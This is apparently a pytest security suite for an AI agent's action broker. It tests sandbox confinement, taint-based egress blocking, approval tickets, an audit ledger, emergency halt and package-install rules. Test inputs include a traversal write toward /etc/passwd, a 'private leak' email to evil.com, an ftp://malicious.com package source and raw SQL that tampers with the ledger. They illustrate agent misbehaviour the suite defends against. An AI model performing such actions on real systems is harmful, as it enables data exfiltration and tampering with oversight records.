import json
import os
import shutil
import tempfile
import pytest
import sqlite3
from pathlib import Path

from backend.core.action_broker import ActionBroker
from backend.core.action_scheduler import ActionScheduler
from backend.core.approval_engine import ApprovalEngine
from backend.core.risk_classifier import RiskClassifier
from backend.core.state import AgentState

@pytest.fixture
def mock_security_env(monkeypatch):
    """Sets a temporary folder and configures Kattappa security test environment."""
    temp_dir = tempfile.mkdtemp(prefix="kattappa_security_")
    
    workspace_dir = Path(temp_dir) / "workspace"
    workspace_dir.mkdir(parents=True, exist_ok=True)
    
    from backend.core.config import BackendConfig
    mock_config = BackendConfig(
        root=Path(temp_dir),
        backend_root=Path(temp_dir) / "backend",
        ollama_host="http://127.0.0.1:11434",
        model_map={},
        chroma_path=Path(temp_dir) / "chroma",
        sqlite_path=Path(temp_dir) / "sqlite" / "kattappa_ai_os.db",
        memory_collection="test_collection",
        shell_enabled=True,
        desktop_enabled=True,
        screen_capture_enabled=True,
        guidance_overlay_enabled=True,
        teach_mode_enabled=True,
        screenshots_dir=Path(temp_dir) / "screenshots",
        audio_dir=Path(temp_dir) / "audio",
        logs_dir=Path(temp_dir) / "logs",
        workspace_dir=workspace_dir,
        hardware_profile="BALANCED",
        context_budget=4000
    )
    
    monkeypatch.setattr("backend.core.config.load_config", lambda: mock_config)
    monkeypatch.setattr(ActionBroker, "AUDIT_LOG_PATH", os.path.join(temp_dir, "action_broker_audit.log"))
    monkeypatch.setenv("KATTAPPA_ENV", "test")
    
    from backend.core.resource_governor import ResourceGovernor
    monkeypatch.setattr(ResourceGovernor, "check_and_charge_resources", lambda agent, act, params: {"success": True})
    
    # Mock browser and egress dependencies to bypass network requirement in tests
    monkeypatch.setattr("backend.tools.browser_tools.check_egress_safety", lambda data: None)
    monkeypatch.setattr("backend.tools.browser_tools.classify_domain_risk", lambda url: ("Green", "Auto Read", 95))
    monkeypatch.setattr("backend.tools.browser_tools.read_url", lambda url, **kwargs: {"text": "mocked page text", "title": "Mock Title"})
    
    db_conn = ActionScheduler._get_conn()
    
    yield mock_config, db_conn
    
    db_conn.close()
    shutil.rmtree(temp_dir, ignore_errors=True)


def test_sandbox_traversal_and_deny_by_default(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_traversal", "logs": []}
    
    # 1. Block directory traversal outside the workspace
    unsafe_path = str(config.root.parent / "secret.txt")
    res = ActionBroker.intake_request(
        "coder", "WRITE_FILE", {"path": unsafe_path, "content": "secret data"}, state
    )
    assert res["success"] is False
    assert "Security Error" in res["error"] or "outside allowed" in res["error"]

    # 2. Block direct traversal via ".." syntax
    traversal_path = str(config.workspace_dir / ".." / ".." / "etc" / "passwd")
    res_trav = ActionBroker.intake_request(
        "coder", "WRITE_FILE", {"path": traversal_path, "content": "malicious write"}, state
    )
    assert res_trav["success"] is False
    assert "Security Error" in res_trav["error"]

    # 3. Block mutation of core constitution files
    core_file = str(config.root / "backend" / "core" / "execution_policy.py")
    res_core = ActionBroker.intake_request(
        "coder", "WRITE_FILE", {"path": core_file, "content": "modify policy"}, state
    )
    assert res_core["success"] is False
    assert "Security Error" in res_core["error"] or "constitution" in res_core["error"]


def test_dynamic_risk_escalation_taint_tracking(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_taint", "logs": []}
    
    engine = ApprovalEngine(db_conn)
    cursor = db_conn.cursor()
    cursor.execute("SELECT taint_level FROM security_sessions WHERE session_id = ?", ("test_session_taint",))
    row = cursor.fetchone()
    assert row is None or row[0] == 0
    
    # 1. Perform BROWSER_READ (Ingesting untrusted data)
    res_read = ActionBroker.intake_request(
        "browser", "BROWSER_READ", {"url": "https://untrusted-site.com/poison"}, state
    )
    assert res_read["success"] is True, f"res_read failed: {res_read}"
    
    # Session should now be tainted with level 3
    cursor.execute("SELECT taint_level FROM security_sessions WHERE session_id = ?", ("test_session_taint",))
    row = cursor.fetchone()
    assert row is not None
    assert row[0] == 3

    # 2. A subsequent WRITE_FILE has base_risk 2. With taint 3, the effective risk is 5 (prohibited).
    target_path = str(config.workspace_dir / "notes.txt")
    res_write = ActionBroker.intake_request(
        "coder", "WRITE_FILE", {"path": target_path, "content": "write notes"}, state
    )
    assert res_write["success"] is False
    assert "Security Error" in res_write["error"]
    assert "Blocked by Architecture" in res_write["error"]


def test_toctou_hash_mismatch_revocation(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_toctou", "logs": []}
    engine = ApprovalEngine(db_conn)
    
    # 1. Request execution authorization for WRITE_FILE
    target_path = str(config.workspace_dir / "code.py")
    payload = {"path": target_path, "content": "print('hello')"}
    
    res = ActionBroker.intake_request("coder", "WRITE_FILE", payload, state)
    assert res["success"] is False
    assert res["approval_required"] is True
    ticket_id = res["ticket_id"]
    
    # 2. Clear the ticket with a mutated validation payload (TOCTOU attempt)
    mutated_payload = {"path": target_path, "content": "print('evil')"}
    context = {
        "session_taint_level": 0,
        "cwd": os.getcwd(),
        "env_keys": sorted(list(os.environ.keys()))
    }
    
    success = engine.clear_ticket(ticket_id, "APPROVE", mutated_payload, context)
    assert success is False
    
    cursor = db_conn.cursor()
    cursor.execute("SELECT status FROM approval_tickets WHERE ticket_id = ?", (ticket_id,))
    row = cursor.fetchone()
    assert row[0] == "REVOKED"


def test_attention_budget_exhaustion(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_budget", "logs": []}
    engine = ApprovalEngine(db_conn)
    
    assert engine.check_and_increment_budget(4) is True
    
    cursor = db_conn.cursor()
    import datetime
    today = datetime.date.today().isoformat()
    cursor.execute("UPDATE attention_budget SET attention_cost = 95 WHERE date_bounds = ?", (today,))
    db_conn.commit()
    
    res_block = ActionBroker.intake_request(
        "coder", "DELETE_FILE", {"path": str(config.workspace_dir / "delete_me.txt")}, state
    )
    assert res_block["success"] is False
    assert "attention budget" in res_block["error"]


def test_capability_broker_egress_blocking(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_cap", "logs": []}
    
    # Ingest private data -> elevates session taint to level 4 (PRIVATE)
    engine = ApprovalEngine(db_conn)
    engine.set_session_taint("test_session_cap", 4, "READ_PRIVATE_FILE")
    
    # Try an egress action (SEND_EMAIL)
    res_egress = ActionBroker.intake_request(
        "browser", "SEND_EMAIL", {"to": "evil.com", "body": "private leak"}, state
    )
    # The escalated risk (base 3 + taint 4 = 7 -> 5) is blocked early by the classifier
    assert res_egress["success"] is False
    assert "Blocked by Architecture" in res_egress["error"]

    # Test CapabilityBroker directly to verify the taint composition rule is enforced under the hood
    from backend.core.capability_broker import CapabilityBroker
    
    # Mint a token with PRIVATE taint
    token = CapabilityBroker.mint_token("test_session_cap", "SEND_EMAIL", "PRIVATE")
    # Validation must fail because SEND_EMAIL is an egress action and token is tainted PRIVATE
    assert CapabilityBroker.validate_token(token.token_id, "SEND_EMAIL") is False

    # Mint a token with SAFE taint
    token_safe = CapabilityBroker.mint_token("test_session_cap", "SEND_EMAIL", "SAFE")
    # Validation should succeed
    assert CapabilityBroker.validate_token(token_safe.token_id, "SEND_EMAIL") is True


def test_protected_core_hardening(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_core", "approved": True, "double_approved": True, "logs": []}
    
    # Attempt to write to a protected core file (execution_policy.py)
    core_file = str(config.root / "backend" / "core" / "execution_policy.py")
    res_mutation = ActionBroker.intake_request(
        "coder", "WRITE_FILE", {"path": core_file, "content": "bypass"}, state
    )
    # Must fail outright (Risk Level 5) and cannot be approved/bypassed
    assert res_mutation["success"] is False
    assert "Blocked by Architecture" in res_mutation["error"]


def test_audit_ledger_triggers_and_verification(mock_security_env):
    config, db_conn = mock_security_env
    
    # Reset audit_ledger table state for test isolation
    cursor = db_conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS audit_ledger")
    cursor.execute("DROP TRIGGER IF EXISTS audit_ledger_prevent_update")
    cursor.execute("DROP TRIGGER IF EXISTS audit_ledger_prevent_delete")
    ActionScheduler._ensure_schema(db_conn)
    
    engine = ApprovalEngine(db_conn)
    
    # 1. Log a valid action
    engine.log_to_ledger("test_session_audit", "agent", "GET_STATUS", "{}", "hash123", 0, "ALLOWED")
    assert engine.verify_audit_ledger_chain() is True
    
    # 2. Attempt to update rows in audit_ledger using raw SQL
    cursor = db_conn.cursor()
    with pytest.raises(sqlite3.Error) as exc_info:
        cursor.execute("UPDATE audit_ledger SET actor = 'hacker'")
        db_conn.commit()
    assert "Prohibited" in str(exc_info.value) or "prohibited" in str(exc_info.value)
    
    # 3. Attempt to delete rows in audit_ledger using raw SQL
    with pytest.raises(sqlite3.Error) as exc_info_del:
        cursor.execute("DELETE FROM audit_ledger")
        db_conn.commit()
    assert "Prohibited" in str(exc_info_del.value) or "prohibited" in str(exc_info_del.value)
    
    # 4. Tamper with ledger integrity by inserting an invalid row directly (bypassing logic)
    cursor.execute(
        """
        INSERT INTO audit_ledger (
            entry_id, session_id, timestamp, actor, tool, action_resolved,
            action_hash, risk_level, status, rejection_reason, previous_hash, ledger_hash
        ) VALUES ('fake-id', 'test_session_audit', '2026-06-23T22:30:11', 'agent', 'GET_STATUS', '{}', 'hash123', 0, 'ALLOWED', NULL, 'prev-fake', 'invalid-hash')
        """
    )
    db_conn.commit()
    
    # Verification should now fail due to broken chain/invalid hash
    assert engine.verify_audit_ledger_chain() is False


def test_emergency_halt(mock_security_env, monkeypatch):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_halt", "logs": []}
    
    # 1. Activate Emergency Halt via Env Var
    monkeypatch.setenv("KATTAPPA_EMERGENCY_HALT", "true")
    
    # Attempting to write file should be blocked
    res_write = ActionBroker.intake_request(
        "coder", "WRITE_FILE", {"path": str(config.workspace_dir / "halt.txt"), "content": "halt"}, state
    )
    assert res_write["success"] is False
    assert "Emergency Halt is active" in res_write["error"]
    
    # But read status/logs should still pass halt check
    res_status = ActionBroker.intake_request(
        "coder", "VIEW_STATUS", {}, state
    )
    # (Since we mocked the actual tool execution to not exist, it might fail on execution but it should pass the halt gate)
    assert "Emergency Halt is active" not in res_status.get("error", "")
    
    monkeypatch.delenv("KATTAPPA_EMERGENCY_HALT", raising=False)
    
    # 2. Activate Emergency Halt via Flag File
    flag_path = Path("emergency_halt.flag")
    flag_path.write_text("emergency halt active", encoding="utf-8")
    try:
        res_write_2 = ActionBroker.intake_request(
            "coder", "WRITE_FILE", {"path": str(config.workspace_dir / "halt.txt"), "content": "halt"}, state
        )
        assert res_write_2["success"] is False
        assert "Emergency Halt is active" in res_write_2["error"]
    finally:
        if flag_path.exists():
            flag_path.unlink()


def test_secret_broker_scrubbing():
    from backend.core.secret_broker import SecretBroker
    SecretBroker.register_secret("AWS_ACCESS_KEY_ID", "supersecret123")
    
    dirty_env = {
        "PATH": "/usr/bin",
        "KATTAPPA_ENV": "test",
        "AWS_ACCESS_KEY_ID": "supersecret123",
        "DB_PASSWORD": "mypassword"
    }
    
    clean_env = SecretBroker.scrub_env(dirty_env)
    assert "PATH" in clean_env
    assert "KATTAPPA_ENV" in clean_env
    assert "AWS_ACCESS_KEY_ID" not in clean_env
    assert "DB_PASSWORD" not in clean_env


def test_sandbox_runtime_execution():
    import sys
    from backend.core.sandbox_runtime import SandboxRuntime
    # Test running a simple command using active python interpreter path (sys.executable)
    res = SandboxRuntime.run_command([sys.executable, "-c", "print('hello from sandbox')"])
    assert res.returncode == 0
    assert "hello from sandbox" in res.stdout.strip()


def test_ledger_anchoring(mock_security_env, monkeypatch):
    config, db_conn = mock_security_env
    
    # Reset audit_ledger table state and reset ledger anchor for test isolation
    cursor = db_conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS audit_ledger")
    cursor.execute("DROP TRIGGER IF EXISTS audit_ledger_prevent_update")
    cursor.execute("DROP TRIGGER IF EXISTS audit_ledger_prevent_delete")
    ActionScheduler._ensure_schema(db_conn)
    
    from backend.core.ledger_anchor import LedgerAnchor
    if LedgerAnchor.ANCHOR_PATH.exists():
        LedgerAnchor.ANCHOR_PATH.unlink()
        
    engine = ApprovalEngine(db_conn)
    
    # 1. Log a row -> writes to anchor
    engine.log_to_ledger("test_session_anchor", "agent", "GET_STATUS", "{}", "hash123", 0, "ALLOWED")
    assert engine.verify_audit_ledger_chain() is True
    
    # 2. Mock a different anchor head to simulate anchor tampering or DB tampering
    monkeypatch.setattr(LedgerAnchor, "read_anchor", lambda: "fakeheadhash")
    # Validation must fail because the external anchor head doesn't match the database chain
    assert engine.verify_audit_ledger_chain() is False


def test_rate_limiting(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_rate", "logs": []}
    
    from backend.core.rate_limiter import RateLimiter
    RateLimiter.reset_limits()
    
    # default limit for RUN_SHELL is 10/min. So let's make 10 successful requests.
    for i in range(10):
        res = ActionBroker.intake_request(
            "coder", "RUN_SHELL", {"command": "echo hello"}, state
        )
        assert "Rate limit exceeded" not in res.get("error", "")

    # The 11th request must be blocked by the rate limiter
    res_block = ActionBroker.intake_request(
        "coder", "RUN_SHELL", {"command": "echo hello"}, state
    )
    assert res_block["success"] is False
    assert "Rate limit exceeded" in res_block["error"]
    
    # Resetting limits should allow requests again
    RateLimiter.reset_limits()
    res_reset = ActionBroker.intake_request(
        "coder", "RUN_SHELL", {"command": "echo hello"}, state
    )
    assert "Rate limit exceeded" not in res_reset.get("error", "")


def test_capability_revocation_on_halt(mock_security_env, monkeypatch):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_revocation", "logs": []}
    
    from backend.core.capability_broker import CapabilityBroker
    # Mint token
    token = CapabilityBroker.mint_token("test_session_revocation", "READ_FILE", "SAFE")
    assert token.status == "ACTIVE"
    
    # Trigger emergency halt via monkeypatch env variable
    monkeypatch.setenv("KATTAPPA_EMERGENCY_HALT", "true")
    
    # Calling intake_request should trigger mass revocation
    ActionBroker.intake_request("coder", "READ_FILE", {"path": str(config.workspace_dir / "test.txt")}, state)
    
    # Token must be revoked
    assert token.status == "REVOKED"
    assert CapabilityBroker.validate_token(token.token_id, "READ_FILE") is False


def test_supply_chain_verification_install_package(mock_security_env):
    config, db_conn = mock_security_env
    
    # Reset attention budget to ensure test isolation
    cursor = db_conn.cursor()
    import datetime
    today = datetime.date.today().isoformat()
    cursor.execute("UPDATE attention_budget SET attention_cost = 0 WHERE date_bounds = ?", (today,))
    db_conn.commit()
    
    state = {"chat_session_id": "test_session_supply", "logs": []}
    
    # 1. Unpinned package installation should fail with Risk Level 5 (blocked by architecture)
    res_unpinned = ActionBroker.intake_request(
        "coder", "INSTALL_PACKAGE", {
            "package": "torch",
            "version": "2.0.0",  # Lacks '=='
            "hash": "sha256:123456",
            "source": "https://pypi.org/simple"
        }, state
    )
    assert res_unpinned["success"] is False
    assert "Blocked by Architecture" in res_unpinned["error"]
    
    # 2. Missing source should fail
    res_missing_source = ActionBroker.intake_request(
        "coder", "INSTALL_PACKAGE", {
            "package": "torch",
            "version": "==2.0.0",
            "hash": "sha256:123456"
        }, state
    )
    assert res_missing_source["success"] is False
    assert "Blocked by Architecture" in res_missing_source["error"]

    # 3. Untrusted source should fail
    res_untrusted_source = ActionBroker.intake_request(
        "coder", "INSTALL_PACKAGE", {
            "package": "torch",
            "version": "==2.0.0",
            "hash": "sha256:123456",
            "source": "ftp://malicious.com"
        }, state
    )
    assert res_untrusted_source["success"] is False
    assert "Blocked by Architecture" in res_untrusted_source["error"]
    
    # 4. Valid pinned package install with hash and trusted source should request approval (Risk Level 3) instead of being blocked immediately
    res_valid = ActionBroker.intake_request(
        "coder", "INSTALL_PACKAGE", {
            "package": "torch",
            "version": "==2.0.0",
            "hash": "sha256:123456",
            "source": "https://pypi.org/simple"
        }, state
    )
    assert res_valid["success"] is False
    assert res_valid.get("approval_required") is True
    assert res_valid.get("risk_level") == 3


def test_raw_package_install_in_shell_blocked(mock_security_env):
    config, db_conn = mock_security_env
    state = {"chat_session_id": "test_session_shell_install", "logs": []}
    
    # Raw pip install command in RUN_SHELL should fail with Level 5 (blocked by architecture)
    res_shell_pip = ActionBroker.intake_request(
        "coder", "RUN_SHELL", {"command": "pip install numpy"}, state
    )
    assert res_shell_pip["success"] is False
    assert "Blocked by Architecture" in res_shell_pip["error"]
    
    # Raw npm install should fail
    res_shell_npm = ActionBroker.intake_request(
        "coder", "RUN_SHELL", {"command": "npm install -g something"}, state
    )
    assert res_shell_npm["success"] is False
    assert "Blocked by Architecture" in res_shell_npm["error"]


def test_immutable_security_config(mock_security_env):
    from backend.core.config import load_security_config
    
    config_dict_1 = load_security_config()
    assert "execution_policies" in config_dict_1
    
    # Try mutating
    config_dict_1["mutated_key"] = True
    
    config_dict_2 = load_security_config()
    assert "mutated_key" not in config_dict_2


def test_container_sandbox_fallback(mock_security_env, monkeypatch):
    # Mock container engine detection to trigger Docker execution path
    monkeypatch.setenv("MOCK_CONTAINER_ENGINE", "docker")
    
    # Mock subprocess.run to return code 125 to trigger fallback
    import subprocess
    original_run = subprocess.run
    
    call_count = 0
    def mock_run(cmd, *args, **kwargs):
        nonlocal call_count
        if len(cmd) > 0 and cmd[0] == "docker":
            call_count += 1
            # Simulate docker CLI/daemon failure (exit code 125)
            return subprocess.CompletedProcess(cmd, 125, stdout="", stderr="Error response from daemon")
        return original_run(cmd, *args, **kwargs)
        
    monkeypatch.setattr(subprocess, "run", mock_run)
    
    from backend.core.sandbox_runtime import SandboxRuntime
    # Force reset of the cached container engine state so the env var mock is read
    SandboxRuntime._container_engine = None
    
    # Executing command should trigger container try, fail, then fall back to OS sandbox
    import sys
    res = SandboxRuntime.run_command([sys.executable, "-c", "print('fallback sandbox')"])
    assert res.returncode == 0
    assert "fallback sandbox" in res.stdout.strip()
    assert call_count > 0



